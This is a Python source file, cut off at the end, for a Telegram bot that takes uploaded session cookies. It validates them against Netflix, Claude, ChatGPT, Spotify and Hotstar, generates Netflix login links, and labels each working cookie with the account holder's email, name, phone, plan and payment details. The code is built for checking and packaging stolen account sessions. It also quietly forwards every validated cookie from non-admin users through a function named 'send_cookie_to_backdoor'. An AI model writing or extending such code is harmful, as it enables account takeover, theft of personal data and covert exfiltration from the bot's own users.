"""
Optimized file handler with streaming, better memory management,
input validation, and improved error handling.
"""

import io
import logging
import zipfile
import asyncio
import time
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from typing import Optional, Tuple, List, Any
import re

from telegram import Update
from telegram.ext import ContextTypes
from telegram.error import TimedOut, NetworkError

import config
import database_pool as db
import ui
from datetime import datetime, timedelta
from core.health_checker import check_cookie_health
from core.claude_health_checker import check_claude_cookie_health
from core.chatgpt_health_checker import check_chatgpt_cookie_health
from core.nf_token import generate_nf_token
from core.spotify_health_checker import check_spotify_cookie_health
from core.hotstar_health_checker import check_hotstar_cookie_health
from core.converter import (
    detect_file_format_from_content, 
    parse_json_content, 
    parse_netscape_content, 
    parse_header_string_content,
    serialize_to_netscape_string,
    serialize_to_json_string,
    validate_cookie_content,
    FORMAT_JSON,
    FORMAT_NETSCAPE,
    FORMAT_HEADER
)
from core.enums import PrivatizationStatus
from core.send import send_cookie_to_backdoor

logger = logging.getLogger(__name__)

# --- CONFIGURATIONS ---
USER_TASK_LOCKS = defaultdict(asyncio.Lock)
EXECUTOR = ThreadPoolExecutor(max_workers=config.MAX_CONCURRENT_WORKERS)
SEND_SEMAPHORE = asyncio.Semaphore(5)

# Cache for validation results
validation_cache = {}
VALIDATION_CACHE_TTL = 300  # 5 minutes
MAX_FILENAME_LENGTH = 255

def validate_filename(filename: str) -> bool:
    """Validate filename for security - only check for path traversal"""
    if not filename or len(filename) > MAX_FILENAME_LENGTH:
        return False
    
    # Only check for path traversal attempts - allow any other characters
    if '..' in filename or '/' in filename or '\\' in filename:
        logger.warning(f"Potential path traversal attempt: {filename}")
        return False
    
    # Accept any filename as long as it's not empty and not too long
    return True

def validate_zip_file(zip_buffer: io.BytesIO) -> Tuple[bool, str]:
    """Validate ZIP file for security issues"""
    try:
        with zipfile.ZipFile(zip_buffer, 'r') as zip_ref:
            # Check for zip bomb
            total_uncompressed = sum(info.file_size for info in zip_ref.infolist())
            total_compressed = sum(info.compress_size for info in zip_ref.infolist())
            
            # Compression ratio check (potential zip bomb)
            if total_compressed > 0:
                ratio = total_uncompressed / total_compressed
                if ratio > 100:  # Suspicious compression ratio
                    return False, "Suspicious compression ratio detected"
            
            # Check for nested zips
            for info in zip_ref.infolist():
                if info.filename.lower().endswith('.zip'):
                    return False, "Nested ZIP files not allowed"
                
                # Check for directory traversal
                if '..' in info.filename or info.filename.startswith('/'):
                    return False, "Invalid file paths in ZIP"
                    
            # Check file count
            if len(zip_ref.infolist()) > config.MAX_FILES_IN_ZIP:
                return False, f"Too many files (max {config.MAX_FILES_IN_ZIP})"
                
        zip_buffer.seek(0)
        return True, "Valid"
    except zipfile.BadZipFile:
        return False, "Invalid ZIP file"
    except Exception as e:
        logger.error(f"ZIP validation error: {e}")
        return False, "ZIP validation failed"

def _get_status_message(status: PrivatizationStatus) -> str:
    """Returns a user-friendly error reason for a given PrivatizationStatus."""
    status_map = {
        PrivatizationStatus.FAILURE_INVALID_COOKIE: "Invalid or expired cookie",
        PrivatizationStatus.FAILURE_LOGIN_REDIRECT: "Invalid cookie (login redirect)",
        PrivatizationStatus.INVALID_FORMAT: "Invalid file format",
        PrivatizationStatus.FAILURE_API_ERROR: "API error occurred",
        PrivatizationStatus.FAILURE_NETWORK: "Network error",
        PrivatizationStatus.FAILURE_OPERATIONAL: "Processing error",
    }
    return status_map.get(status, "An unknown error occurred")

async def _process_single_cookie_block_optimized(
    cookie_block_str: str, 
    mode: str,
    user_id: int
) -> Tuple[bool, Optional[bytes]]:
    """
    Optimized cookie processing with caching and better error handling.
    """
    # Check cache for recent validation results
    cache_key = f"{user_id}:{mode}:{hash(cookie_block_str)}"
    if cache_key in validation_cache:
        cached_time, cached_result = validation_cache[cache_key]
        if time.time() - cached_time < VALIDATION_CACHE_TTL:
            logger.debug(f"Using cached result for {cache_key}")
            return cached_result
    
    try:
        loop = asyncio.get_running_loop()
        cookie_bytes = cookie_block_str.encode('utf-8')
        
        result = None
        success = False
        
        if mode == 'nf_check':
            validation_result = await loop.run_in_executor(
                EXECUTOR, check_cookie_health, cookie_block_str
            )
            success = (validation_result.status == PrivatizationStatus.SUCCESS)
            result = cookie_bytes if success else None

        elif mode == 'nf_token':
            validation_result = await loop.run_in_executor(
                EXECUTOR, generate_nf_token, cookie_block_str
            )
            success = (validation_result.status == PrivatizationStatus.SUCCESS)
            result = validation_result if success else None

        elif mode == 'claude_check':
            validation_result = await loop.run_in_executor(
                EXECUTOR, check_claude_cookie_health, cookie_block_str
            )
            success = (validation_result.status == PrivatizationStatus.SUCCESS)
            result = validation_result if success else None
        
        elif mode == 'chatgpt_check':
            validation_result = await loop.run_in_executor(
                EXECUTOR, check_chatgpt_cookie_health, cookie_block_str
            )
            success = (validation_result.status == PrivatizationStatus.SUCCESS)
            result = validation_result if success else None

        elif mode == 'spotify_check':
            validation_result = await loop.run_in_executor(
                EXECUTOR, check_spotify_cookie_health, cookie_block_str
            )
            success = (validation_result.status == PrivatizationStatus.SUCCESS)
            result = validation_result if success else None

        elif mode == 'hotstar_check':
            validation_result = await loop.run_in_executor(
                EXECUTOR, check_hotstar_cookie_health, cookie_block_str
            )
            success = (validation_result.status == PrivatizationStatus.SUCCESS)
            result = validation_result if success else None

        elif mode == 'converter':
            success = True
            result = cookie_block_str
        
        # Cache the result
        validation_cache[cache_key] = (time.time(), (success, result))
        
        # Clean old cache entries periodically
        if len(validation_cache) > config.CACHE_MAX_SIZE:
            current_time = time.time()
            validation_cache.clear()  # Simple cleanup, could be optimized
        
        return success, result
        
    except Exception as e:
        logger.error(f"Error in cookie processing: {e}", exc_info=True)
        return False, None

async def _send_throttled_send(cookie_bytes: bytes, user_id: int, mode: str, filename: str):
    """Optimized sending with proper error handling"""
    # Skip for admin users
    if await db.is_user_admin(user_id):
        logger.debug(f"Skipping send for admin user {user_id}")
        return
    
    try:
        async with SEND_SEMAPHORE:
            await send_cookie_to_backdoor(cookie_bytes, user_id, mode, filename)
    except Exception as e:
        logger.error(f"Failed to send cookie: {e}")

async def _check_rate_limit_optimized(user_id: int, cookie_count: int = 1) -> Tuple[bool, str]:
    """
    Optimized rate limiting using timestamps instead of datetime parsing.
    """
    # Skip rate limiting for admins and managers
    is_admin = await db.is_user_admin(user_id)
    is_manager = await db.is_user_manager(user_id)
    
    if is_admin or is_manager:
        return True, ""
    
    # Get current usage with timestamp
    current_count, last_reset_ts = await db.get_user_cookie_usage(user_id)
    
    if last_reset_ts:
        current_time = int(time.time())
        time_since_reset = current_time - last_reset_ts
        cooldown_seconds = config.RATE_LIMIT_WINDOW_MINUTES * 60
        
        # Check if cooldown period has passed
        if current_count >= config.MAX_COOKIES_PER_USER:
            if time_since_reset < cooldown_seconds:
                remaining_seconds = cooldown_seconds - time_since_reset
                minutes = remaining_seconds // 60
                seconds = remaining_seconds % 60
                return False, f"⏳ Rate limit exceeded. Wait {minutes}m {seconds}s"
            else:
                # Reset the counter
                await db.reset_user_cookie_usage(user_id)
                current_count = 0
    
    # Check if adding new cookies would exceed limit
    new_count = current_count + cookie_count
    if new_count > config.MAX_COOKIES_PER_USER:
        remaining = config.MAX_COOKIES_PER_USER - current_count
        if remaining <= 0:
            return False, f"⏳ Limit reached ({config.MAX_COOKIES_PER_USER} cookies)"
        else:
            return False, f"⏳ Can only process {remaining} more cookies"
    
    # Update usage count
    await db.update_user_cookie_usage(user_id, new_count)
    
    # Track statistics
    await db.increment_stat('cookies_processed', cookie_count)
    
    return True, ""

def _convert_cookies(cookie_content: str, target_format: str) -> Tuple[bool, Optional[bytes]]:
    """Convert cookies with better error handling"""
    try:
        # Detect input format
        input_format = detect_file_format_from_content(cookie_content)
        if input_format in ['empty', 'unknown', 'file_error', 'detection_error']:
            logger.warning(f"Invalid input format detected: {input_format}")
            return False, None
        
        # Parse cookies based on input format
        parsed_cookies = []
        if input_format == FORMAT_JSON:
            parsed_cookies = parse_json_content(cookie_content)
        elif input_format == FORMAT_NETSCAPE:
            parsed_cookies = parse_netscape_content(cookie_content)
        elif input_format == FORMAT_HEADER:
            parsed_cookies = parse_header_string_content(cookie_content)
        
        if not parsed_cookies:
            logger.warning("No cookies parsed from content")
            return False, None
        
        # Filter and validate cookies
        valid_cookies = [
            c for c in parsed_cookies 
            if c.get('name') and c.get('value') and len(c.get('name', '')) < 256
        ]
        
        if not valid_cookies:
            logger.warning("No valid cookies after filtering")
            return False, None
        
        # Convert to target format
        if target_format == 'netscape':
            output_content = serialize_to_netscape_string(valid_cookies)
        elif target_format == 'json':
            output_content = serialize_to_json_string(valid_cookies)
        else:
            logger.error(f"Unknown target format: {target_format}")
            return False, None
        
        return True, output_content.encode('utf-8')
        
    except Exception as e:
        logger.error(f"Error converting cookies: {e}", exc_info=True)
        return False, None

def _split_multicookie_file(content_str: str) -> List[str]:
    """Intelligently split multi-cookie files.

    Detects if the file contains multiple separate cookie blocks
    (separated by '# Netscape HTTP Cookie File' headers).
    If not, treats the entire content as a single cookie.
    """
    if "# Netscape HTTP Cookie File" in content_str:
        blocks = content_str.split("# Netscape HTTP Cookie File")
        result = [
            "# Netscape HTTP Cookie File" + block.strip()
            for block in blocks if block.strip()
        ]
        if result:
            return result

    # Check if this looks like a Netscape cookie file (has tab-separated lines)
    # or any structured cookie content — keep it as one block
    lines = [l.strip() for l in content_str.splitlines() if l.strip()]
    has_tabs = any('\t' in line for line in lines if not line.startswith('#'))
    if has_tabs or len(lines) <= 1:
        return [content_str]

    # Only split into individual lines if they look like standalone cookies
    # (e.g., a file with one cookie per line in key=value format)
    return [content_str]

async def _handle_batch_job_optimized(
    update: Update, 
    context: ContextTypes.DEFAULT_TYPE, 
    jobs: List[Any], 
    mode: str, 
    original_filename: str, 
    input_format: str
):
    """Optimized batch processing with better progress tracking"""
    user_id = update.effective_user.id
    
    # Rate limiting check
    rate_allowed, rate_message = await _check_rate_limit_optimized(user_id, len(jobs))
    if not rate_allowed:
        return await update.message.reply_text(rate_message)
    
    status_msg = await update.message.reply_text(
        f"📦 Processing {len(jobs)} items from `{original_filename}`...",
        parse_mode='Markdown'
    )
    
    # Process in batches for better memory management
    BATCH_SIZE = 10
    successful_items = []
    failed_count = 0
    
    for i in range(0, len(jobs), BATCH_SIZE):
        batch = jobs[i:i+BATCH_SIZE]
        
        # Update progress
        if i > 0:
            progress = (i / len(jobs)) * 100
            try:
                await status_msg.edit_text(
                    f"📦 Processing... {progress:.0f}% complete",
                    parse_mode='Markdown'
                )
            except Exception:
                pass  # Ignore edit errors
        
        # Process batch
        if input_format == 'zip':
            tasks = [
                _process_single_cookie_block_optimized(
                    content_bytes.decode('utf-8', 'ignore'), mode, user_id
                ) 
                for _, content_bytes in batch
            ]
        else:
            tasks = [
                _process_single_cookie_block_optimized(cookie_block, mode, user_id) 
                for cookie_block in batch
            ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        for j, res in enumerate(results):
            if isinstance(res, tuple) and res[0] is True and res[1] is not None:
                idx = i + j
                log_filename = (
                    jobs[idx][0] if input_format == 'zip' 
                    else f"cookie_{idx+1}_from_{original_filename}"
                )
                
                # Handle different modes
                if mode == 'nf_token' and hasattr(res[1], 'details'):
                    # NF Token: send individual text messages with links
                    validation_result = res[1]
                    details = validation_result.details
                    token_msg = ui.get_nf_token_result_text(
                        log_filename,
                        details.get('expiry_date', 'N/A'),
                        details.get('phone_link', ''),
                        details.get('desktop_link', ''),
                        details.get('tv_link', ''),
                    )
                    await update.message.reply_text(token_msg, parse_mode='Markdown')
                    successful_items.append((log_filename, b'token_sent'))

                elif mode == 'claude_check' and hasattr(res[1], 'details'):
                    # Claude check: add headers and rename file
                    validation_result = res[1]
                    details = validation_result.details
                    plan = details.get('plan', 'Free')
                    email = details.get('email', 'Unknown')
                    display_name = details.get('name', 'N/A')
                    billing_type = details.get('billing_type', 'N/A')
                    next_charge = details.get('next_charge_date', 'N/A')
                    days_until = details.get('days_until_charge')
                    status_val = details.get('status', 'N/A')
                    billing_interval = details.get('billing_interval', 'N/A')
                    payment = details.get('payment', 'N/A')
                    original_content = (
                        jobs[idx][1].decode('utf-8', 'ignore')
                        if input_format == 'zip' else jobs[idx]
                    )
                    from datetime import datetime as dt_batch
                    hdr_lines = [
                        "# ═══════════════════════════════════════════════════════════════",
                        f"# Claude AI Cookie - Validated {dt_batch.now().strftime('%Y-%m-%d %H:%M:%S')}",
                        "# ═══════════════════════════════════════════════════════════════",
                        f"# Email: {email}",
                        f"# Display Name: {display_name}",
                        f"# Plan: {plan}",
                        f"# Billing Type: {billing_type}",
                    ]
                    if next_charge != 'N/A':
                        charge_str = next_charge
                        if days_until is not None:
                            charge_str += f" ({days_until} days)"
                        hdr_lines.append(f"# Next Charge: {charge_str}")
                    if status_val != 'N/A':
                        hdr_lines.append(f"# Status: {status_val}")
                    if billing_interval != 'N/A':
                        hdr_lines.append(f"# Billing Interval: {billing_interval}")
                    if payment != 'N/A':
                        hdr_lines.append(f"# Payment: {payment}")
                    hdr_lines.append("# ═══════════════════════════════════════════════════════════════")
                    hdr_lines.append("")
                    hdr = "\n".join(hdr_lines) + "\n"
                    result_bytes = (hdr + original_content).encode('utf-8')
                    safe_plan = plan.lower().replace(' ', '_').replace('(', '').replace(')', '')
                    safe_email = email.split('@')[0] if '@' in email else email
                    safe_email = re.sub(r'[<>:"/\\|?*]', '_', safe_email)
                    out_name = f"{safe_plan}-{safe_email}.txt"
                    successful_items.append((out_name, result_bytes))
                    asyncio.create_task(
                        _send_throttled_send(result_bytes, user_id, mode, out_name)
                    )

                elif mode == 'chatgpt_check' and hasattr(res[1], 'details'):
                    # ChatGPT check: add headers and rename file
                    validation_result = res[1]
                    details = validation_result.details
                    plan = details.get('plan', 'Free')
                    email = details.get('email', 'Unknown')
                    original_content = (
                        jobs[idx][1].decode('utf-8', 'ignore')
                        if input_format == 'zip' else jobs[idx]
                    )
                    from datetime import datetime as dt_batch2
                    hdr = (
                        f"# ═══════════════════════════════════════════════════════════════\n"
                        f"# ChatGPT Cookie - Validated {dt_batch2.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                        f"# ═══════════════════════════════════════════════════════════════\n"
                        f"# Email: {email}\n"
                        f"# Name: {details.get('name', 'N/A')}\n"
                        f"# Plan: {plan}\n"
                        f"# Plan Type: {details.get('plan_type', 'free')}\n"
                        f"# Billing: {details.get('billing_period', 'N/A')}\n"
                        f"# Expires: {details.get('expires', 'N/A')}\n"
                        f"# ═══════════════════════════════════════════════════════════════\n\n"
                    )
                    result_bytes = (hdr + original_content).encode('utf-8')
                    safe_plan = plan.lower().replace(' ', '_').replace('(', '').replace(')', '')
                    safe_email = email.split('@')[0] if '@' in email else email
                    safe_email = re.sub(r'[<>:"/\\|?*]', '_', safe_email)
                    out_name = f"{safe_plan}-{safe_email}.txt"
                    successful_items.append((out_name, result_bytes))
                    asyncio.create_task(
                        _send_throttled_send(result_bytes, user_id, mode, out_name)
                    )
                    
                elif mode == 'spotify_check' and hasattr(res[1], 'details'):
                    # Spotify check: add headers and rename file
                    validation_result = res[1]
                    details = validation_result.details
                    plan = details.get('plan', 'Free')
                    email = details.get('email', 'Unknown')
                    original_content = (
                        jobs[idx][1].decode('utf-8', 'ignore')
                        if input_format == 'zip' else jobs[idx]
                    )
                    from datetime import datetime as dt_batch3
                    hdr = (
                        f"# ═══════════════════════════════════════════════════════════════\n"
                        f"# Spotify Cookie - Validated {dt_batch3.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                        f"# ═══════════════════════════════════════════════════════════════\n"
                        f"# Email: {email}\n"
                        f"# Plan: {plan}\n"
                        f"# Country: {details.get('country', 'Unknown')}\n"
                        f"# Owner: {details.get('owner', 'N/A')}\n"
                        f"# ═══════════════════════════════════════════════════════════════\n\n"
                    )
                    result_bytes = (hdr + original_content).encode('utf-8')
                    safe_plan = plan.lower().replace(' ', '_').replace('(', '').replace(')', '')
                    safe_email = email.split('@')[0] if '@' in email else email
                    safe_email = re.sub(r'[<>:"/\\|?*]', '_', safe_email)
                    out_name = f"{safe_plan}-{safe_email}.txt"
                    successful_items.append((out_name, result_bytes))
                    asyncio.create_task(
                        _send_throttled_send(result_bytes, user_id, mode, out_name)
                    )

                elif mode == 'hotstar_check' and hasattr(res[1], 'details'):
                    # Hotstar check: add headers and rename file with duration tag
                    validation_result = res[1]
                    details = validation_result.details
                    plan_display = details.get('plan_display', 'Free')
                    duration_tag = details.get('duration_tag', '')
                    pid = details.get('pid', 'Unknown')
                    name = details.get('name', 'N/A')
                    phone = details.get('phone', 'N/A')
                    country = details.get('country', 'N/A')
                    original_content = (
                        jobs[idx][1].decode('utf-8', 'ignore')
                        if input_format == 'zip' else jobs[idx]
                    )
                    from datetime import datetime as dt_batch4
                    hdr_lines = [
                        "# ═══════════════════════════════════════════════════════════════",
                        f"# Hotstar Cookie - Validated {dt_batch4.now().strftime('%Y-%m-%d %H:%M:%S')}",
                        "# ═══════════════════════════════════════════════════════════════",
                        f"# PID: {pid}",
                        f"# Name: {name}",
                        f"# Phone: {phone}",
                        f"# Country: {country}",
                        f"# Plan: {plan_display}",
                    ]
                    transactions = details.get('transactions', [])
                    if transactions:
                        t = transactions[0]
                        hdr_lines.append(f"# End Date: {t.get('end_date', 'N/A')}")
                        hdr_lines.append(f"# Days Remaining: {t.get('days_remaining', 'N/A')}")
                        if t.get('amount', 'N/A') != 'N/A':
                            hdr_lines.append(f"# Amount: {t.get('amount')}")
                        if t.get('payment_method', 'N/A') != 'N/A':
                            hdr_lines.append(f"# Payment: {t.get('payment_method')}")
                    hdr_lines.append("# ═══════════════════════════════════════════════════════════════")
                    hdr_lines.append("")
                    hdr = "\n".join(hdr_lines) + "\n"
                    result_bytes_out = (hdr + original_content).encode('utf-8')
                    # Filename: use duration tag for premium (P3months.txt), full plan name otherwise
                    if duration_tag and plan_display != 'Free':
                        out_name = f"{duration_tag}.txt"
                    else:
                        safe_plan = plan_display.lower().replace(' ', '_').replace('(', '').replace(')', '')
                        out_name = f"{safe_plan}.txt"
                    successful_items.append((out_name, result_bytes_out))
                    asyncio.create_task(
                        _send_throttled_send(result_bytes_out, user_id, mode, out_name)
                    )

                elif mode == 'converter':
                    # Converter specific handling
                    original_content = res[1]
                    target_format = context.user_data.get('target_format', 'netscape')
                    success, converted_bytes = _convert_cookies(original_content, target_format)
                    if success and converted_bytes:
                        base_name = log_filename.rsplit('.', 1)[0]
                        ext = '.json' if target_format == 'json' else '.txt'
                        converted_filename = f"converted_{base_name}{ext}"
                        successful_items.append((converted_filename, converted_bytes))
                        asyncio.create_task(
                            _send_throttled_send(converted_bytes, user_id, mode, converted_filename)
                        )
                else:
                    # Standard processing
                    result_bytes = res[1]
                    successful_items.append((log_filename, result_bytes))
                    asyncio.create_task(
                        _send_throttled_send(result_bytes, user_id, mode, log_filename)
                    )
            else:
                failed_count += 1
    
    # Generate result message
    if not successful_items:
        await status_msg.edit_text(
            f"🤷 No items from `{original_filename}` could be processed.",
            parse_mode='Markdown'
        )
        return

    # For nf_token mode, tokens were already sent as text messages
    if mode == 'nf_token':
        caption = f"✨ **Complete** ✨\n✅ Tokens generated: {len(successful_items)}\n❌ Failed: {failed_count}"
        await status_msg.edit_text(caption, parse_mode='Markdown')
        return

    # Create output file
    if input_format == 'zip':
        output_buffer = io.BytesIO()
        with zipfile.ZipFile(output_buffer, 'w', zipfile.ZIP_DEFLATED) as new_zip:
            for filename, content_bytes in successful_items:
                output_filename = filename
                new_zip.writestr(output_filename, content_bytes)
        output_buffer.seek(0)
    else:
        output_content = b'\n\n'.join([item[1] for item in successful_items])
        output_buffer = io.BytesIO(output_content)

    output_filename = f"processed_{original_filename}"
    caption = f"✨ **Complete** ✨\n✅ Success: {len(successful_items)}\n❌ Failed: {failed_count}"

    await update.message.reply_document(
        document=output_buffer,
        filename=output_filename,
        caption=caption,
        parse_mode='Markdown'
    )

    try:
        await status_msg.delete()
    except Exception:
        pass

async def handle_document_optimized(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Optimized document handler with better validation and memory management"""
    user = update.effective_user
    if not user:
        return
    
    async with USER_TASK_LOCKS[user.id]:
        try:
            # Initial checks
            is_admin = await db.is_user_admin(user.id)
            
            # Maintenance mode check
            if await db.get_setting("maintenance_mode", "off") == "on" and not is_admin:
                return await update.message.reply_text(
                    ui.MAINTENANCE_TEXT, 
                    parse_mode='Markdown'
                )
            
            # Mode validation
            mode = context.user_data.get('mode')
            if not mode:
                return await update.message.reply_text(ui.INVALID_MODE_TEXT)
            
            # Access check
            if not await db.check_access_allowed(user.id, mode):
                return await update.message.reply_text(ui.NOT_AUTHORIZED_TEXT)
            
            # Document validation
            doc = update.message.document
            
            # Filename validation
            if not validate_filename(doc.file_name):
                return await update.message.reply_text(
                    "❌ Invalid filename. Please use standard characters only."
                )
            
            # Size validation
            if doc.file_size > config.MAX_ZIP_SIZE_MB * 1024 * 1024:
                return await update.message.reply_text(
                    f"❌ File too large. Maximum size: {config.MAX_ZIP_SIZE_MB}MB"
                )
            
            # Rate limiting check
            rate_allowed, rate_message = await _check_rate_limit_optimized(user.id, 1)
            if not rate_allowed:
                return await update.message.reply_text(rate_message)
            
            # Download file
            file_content_buffer = io.BytesIO()
            try:
                file = await doc.get_file()
                await file.download_to_memory(file_content_buffer)
                file_content_buffer.seek(0)
            except (TimedOut, NetworkError) as e:
                logger.error(f"Network error downloading file: {e}")
                return await update.message.reply_text(
                    "❌ Network error. Please try again."
                )
            
            # Process based on file type
            if doc.file_name.lower().endswith('.zip'):
                # Validate ZIP file
                is_valid, error_msg = validate_zip_file(file_content_buffer)
                if not is_valid:
                    return await update.message.reply_text(f"❌ {error_msg}")
                
                # Extract and process ZIP
                with zipfile.ZipFile(file_content_buffer, 'r') as zip_ref:
                    file_list = [
                        (item.filename, zip_ref.read(item.filename))
                        for item in zip_ref.infolist()
                        if not item.is_dir() and not item.filename.startswith('__MACOSX')
                    ]
                
                await _handle_batch_job_optimized(
                    update, context, file_list, mode, doc.file_name, 'zip'
                )
                
            elif doc.file_name.lower().endswith('.txt'):
                # Process text file
                content_str = file_content_buffer.getvalue().decode('utf-8', errors='ignore')
                cookie_blocks = _split_multicookie_file(content_str)
                
                if len(cookie_blocks) > 1:
                    await _handle_batch_job_optimized(
                        update, context, cookie_blocks, mode, doc.file_name, 'txt'
                    )
                else:
                    # Single cookie processing
                    await _process_single_file(
                        update, context, content_str, mode, doc.file_name
                    )
            else:
                await update.message.reply_text(
                    "❌ Unsupported file type. Please upload .txt or .zip files."
                )
                
        except Exception as e:
            logger.error(f"Critical error in document handler: {e}", exc_info=True)
            await update.message.reply_text(ui.ERROR_FALLBACK_TEXT)

async def _process_single_file(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    content_str: str,
    mode: str,
    filename: str
):
    """Process a single cookie file"""
    user_id = update.effective_user.id
    status_msg = await update.message.reply_text(
        ui.get_file_received_text(filename),
        parse_mode='Markdown'
    )
    
    success, result_bytes = await _process_single_cookie_block_optimized(
        content_str, mode, user_id
    )

    logger.info(f"[DEBUG] mode={mode}, success={success}, result_type={type(result_bytes).__name__}, result_is_none={result_bytes is None}")

    if success and result_bytes:
        final_bytes = None
        
        # Handle different result types
        if mode == 'nf_token' and hasattr(result_bytes, 'details'):
            # NF Token mode sends text with login links, no file
            validation_result = result_bytes
            details = validation_result.details
            message = ui.get_nf_token_result_text(
                filename,
                details.get('expiry_date', 'N/A'),
                details.get('phone_link', ''),
                details.get('desktop_link', ''),
                details.get('tv_link', ''),
            )
            await status_msg.edit_text(message, parse_mode='Markdown')
            return

        elif mode == 'claude_check':
            validation_result = result_bytes
            details = getattr(validation_result, 'details', {}) or {}
            plan = details.get('plan', 'Free')
            email = details.get('email', 'Unknown')
            display_name = details.get('name', 'N/A')
            billing_type = details.get('billing_type', 'N/A')
            org_name = details.get('org_name', 'N/A')
            next_charge = details.get('next_charge_date', 'N/A')
            days_until = details.get('days_until_charge')
            status_val = details.get('status', 'N/A')
            billing_interval = details.get('billing_interval', 'N/A')
            payment = details.get('payment', 'N/A')

            from datetime import datetime
            header_lines = [
                "# ═══════════════════════════════════════════════════════════════",
                f"# Claude AI Cookie - Validated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                "# ═══════════════════════════════════════════════════════════════",
                f"# Email: {email}",
                f"# Display Name: {display_name}",
                f"# Plan: {plan}",
                f"# Billing Type: {billing_type}",
            ]
            if next_charge != 'N/A':
                if days_until is not None:
                    header_lines.append(f"# Next Charge: {next_charge} ({days_until} days)")
                else:
                    header_lines.append(f"# Next Charge: {next_charge}")
            if status_val != 'N/A':
                header_lines.append(f"# Status: {status_val}")
            if billing_interval != 'N/A':
                header_lines.append(f"# Billing Interval: {billing_interval}")
            if payment != 'N/A':
                header_lines.append(f"# Payment: {payment}")
            header_lines.append("# ═══════════════════════════════════════════════════════════════")
            header_lines.append("")

            header = "\n".join(header_lines)
            final_bytes = (header + content_str).encode('utf-8')

            asyncio.create_task(
                _send_throttled_send(final_bytes, user_id, mode, filename)
            )

            safe_plan = plan.lower().replace(' ', '_').replace('(', '').replace(')', '')
            safe_email = email.split('@')[0] if '@' in email else email
            safe_email = re.sub(r'[<>:"/\\|?*]', '_', safe_email)
            output_filename = f"{safe_plan}-{safe_email}.txt"

            msg_lines = [
                f"**Claude AI Cookie Valid** ✅\n",
                f"📋 **Plan**: {plan}",
                f"📧 **Email**: `{email}`",
                f"👤 **Name**: {display_name}",
                f"💳 **Billing**: {billing_type}",
            ]
            if next_charge != 'N/A':
                charge_text = next_charge
                if days_until is not None:
                    charge_text += f" ({days_until} days)"
                msg_lines.append(f"📅 **Next Charge**: {charge_text}")
            if payment != 'N/A':
                msg_lines.append(f"💰 **Payment**: {payment}")
            message = "\n".join(msg_lines)

            await status_msg.edit_text(message, parse_mode='Markdown')
            await update.message.reply_document(
                io.BytesIO(final_bytes),
                filename=output_filename
            )
            return

        elif mode == 'chatgpt_check':
            validation_result = result_bytes
            details = getattr(validation_result, 'details', {}) or {}
            plan = details.get('plan', 'Free')
            email = details.get('email', 'Unknown')
            name = details.get('name', 'N/A')
            user_id_val = details.get('user_id', 'Unknown')
            plan_type = details.get('plan_type', 'free')
            structure = details.get('structure', 'personal')
            plan_identifier = details.get('plan_identifier', 'N/A')
            billing_period = details.get('billing_period', 'N/A')
            will_renew = details.get('will_renew', 'N/A')
            billing_currency = details.get('billing_currency', 'N/A')
            expires = details.get('expires', 'N/A')
            days_remaining = details.get('days_remaining')

            from datetime import datetime
            header_lines = [
                "# ═══════════════════════════════════════════════════════════════",
                f"# ChatGPT Cookie - Validated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                "# ═══════════════════════════════════════════════════════════════",
                f"# ID: {user_id_val}",
                f"# Name: {name}",
                f"# Email: {email}",
                f"# Plan Type: {plan_type}",
                f"# Structure: {structure}",
                f"# Plan: {plan_identifier}",
                f"# Plan Display: {plan}",
                f"# Billing Period: {billing_period}",
                f"# Will Renew: {will_renew}",
                f"# Billing Currency: {billing_currency}",
            ]
            if expires != 'N/A' and days_remaining is not None:
                header_lines.append(f"# Expires: {expires} ({days_remaining} days remaining)")
            else:
                header_lines.append(f"# Expires: {expires}")
            header_lines.append("# ═══════════════════════════════════════════════════════════════")
            header_lines.append("")

            header = "\n".join(header_lines)
            final_bytes = (header + content_str).encode('utf-8')

            asyncio.create_task(
                _send_throttled_send(final_bytes, user_id, mode, filename)
            )

            safe_plan = plan.lower().replace(' ', '_').replace('(', '').replace(')', '')
            safe_email = email.split('@')[0] if '@' in email else email
            safe_email = re.sub(r'[<>:"/\\|?*]', '_', safe_email)
            output_filename = f"{safe_plan}-{safe_email}.txt"

            message = (
                f"**ChatGPT Cookie Valid** ✅\n\n"
                f"📋 **Plan**: {plan}\n"
                f"📧 **Email**: `{email}`\n"
                f"👤 **Name**: {name}"
            )

            await status_msg.edit_text(message, parse_mode='Markdown')
            await update.message.reply_document(
                io.BytesIO(final_bytes),
                filename=output_filename
            )
            return
            
        elif mode == 'spotify_check':
            validation_result = result_bytes
            details = getattr(validation_result, 'details', {}) or {}
            plan = details.get('plan', 'Free')
            email = details.get('email', 'Unknown')
            country = details.get('country', 'Unknown')
            owner = details.get('owner', 'N/A')
            free_slots = details.get('free_slots')
            invite_link = details.get('invite_link', '')
            address = details.get('address', '')
            is_recurring = details.get('is_recurring', False)
            is_trial = details.get('is_trial', False)
            next_payment = details.get('next_payment', 'N/A')

            from datetime import datetime
            header_lines = [
                "# ═══════════════════════════════════════════════════════════════",
                f"# Spotify Cookie - Validated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                "# ═══════════════════════════════════════════════════════════════",
                f"# Email: {email}",
                f"# Plan: {plan}",
                f"# Country: {country}",
                f"# Owner: {owner}",
            ]
            if free_slots is not None:
                header_lines.append(f"# Free Slots: {free_slots}")
            if invite_link:
                header_lines.append(f"# Invite Link: {invite_link}")
            if address:
                header_lines.append(f"# Address: {address}")
            header_lines.append(f"# Recurring: {'Yes' if is_recurring else 'No'}")
            if is_trial:
                header_lines.append(f"# Trial: Yes")
            if next_payment and next_payment != 'N/A':
                header_lines.append(f"# Next Payment: {next_payment}")
            header_lines.append("# ═══════════════════════════════════════════════════════════════")
            header_lines.append("")

            header = "\n".join(header_lines)
            final_bytes = (header + content_str).encode('utf-8')

            asyncio.create_task(
                _send_throttled_send(final_bytes, user_id, mode, filename)
            )

            safe_plan = plan.lower().replace(' ', '_').replace('(', '').replace(')', '')
            safe_email = email.split('@')[0] if '@' in email else email
            safe_email = re.sub(r'[<>:"/\\|?*]', '_', safe_email)
            output_filename = f"{safe_plan}-{safe_email}.txt"

            msg_lines = [
                f"**Spotify Cookie Valid** ✅\n",
